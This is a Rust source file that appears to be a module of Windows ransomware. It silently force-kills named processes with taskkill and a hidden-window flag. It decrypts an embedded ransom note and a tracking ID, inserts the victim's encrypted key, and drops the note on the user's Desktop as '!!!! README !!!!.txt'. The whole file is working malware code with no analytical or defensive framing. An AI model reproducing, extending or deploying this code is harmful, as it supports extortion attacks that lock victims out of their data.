use std::env;
use std::error::Error;
use std::fs::File;
use std::io::Write;
use std::os::windows::process::CommandExt;
use std::path::PathBuf;
use std::process::Command;
use std::sync::OnceLock;

static CACHED_KEY: OnceLock<Vec<u8>> = OnceLock::new();

pub fn kill_process(name: &str) {
    Command::new("taskkill")
        .arg("/f")
        .arg("/im")
        .arg(name)
        .creation_flags(0x08000000)
        .spawn()
        .ok();
}

pub fn drop_note(encoded_key: &str) -> Result<PathBuf, Box<dyn Error>> {
    let note = decrypt_with_public_key(crate::ENCRYPTED_NOTE);
    let tracking_id = decrypt_with_public_key(crate::ENCRYPTED_TRACKING_ID);

    let formatted_note = note
        .replace("%TRACKING_ID%", &tracking_id)
        .replace("%ENCRYPTED_KEY%", encoded_key);

    let userprofile = env::var("USERPROFILE")
        .unwrap();

    let note_path = PathBuf::from(userprofile)
        .join("Desktop\\!!!! README !!!!.txt");

    let mut note_file = File::create(&note_path)?;
    note_file.write_all(formatted_note.as_bytes())?;

    Ok(note_path)
}

pub fn decrypt_with_public_key(data: &[u8]) -> String {
    let key = CACHED_KEY.get_or_init(|| {
        crate::hash::hash_blake3(crate::PUBLICK_KEY)
    });

    let decrypted = crate::crypt::decrypt_data(data, &key)
        .unwrap();

    String::from_utf8_lossy(&decrypted)
        .into_owned()
}
